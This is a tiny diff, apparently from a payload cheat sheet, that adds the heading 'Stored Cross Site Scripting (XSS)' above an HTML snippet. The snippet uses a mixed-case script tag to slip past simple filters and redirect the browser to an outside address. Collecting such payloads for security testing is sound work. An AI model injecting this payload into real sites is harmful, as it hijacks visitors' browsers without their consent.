@@ -1,3 +1,5 @@
+# Stored Cross Site Scripting (XSS)
+
 ```html
 <sCript>location.href="https://1.1.1.1"</sCript>
 ```
